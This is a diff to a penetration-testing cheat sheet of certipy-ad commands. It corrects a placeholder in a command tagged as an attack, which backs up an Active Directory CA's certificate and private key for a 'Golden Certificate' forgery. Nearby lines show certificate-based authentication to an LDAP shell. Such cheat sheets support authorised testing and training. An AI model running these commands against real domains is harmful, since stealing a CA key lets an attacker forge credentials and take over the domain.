@@ -29,7 +29,7 @@ certipy-ad auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
 ## certipy-ad - Golden Certificate - steal CA certificate and private key
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy-ad ca -u '<user>@<domain>' -p '<password>' -ns '<nameserver>' -target '<domain>' -config '<Hn-domain>\CORP-CA' -backup
+certipy-ad ca -u '<user>@<domain>' -p '<password>' -ns '<nameserver>' -target '<domain>' -config '<NetBIOS-domain-name>\CORP-CA' -backup
 ```
 
 ## certipy-ad - Golden Certificate - forge certificate
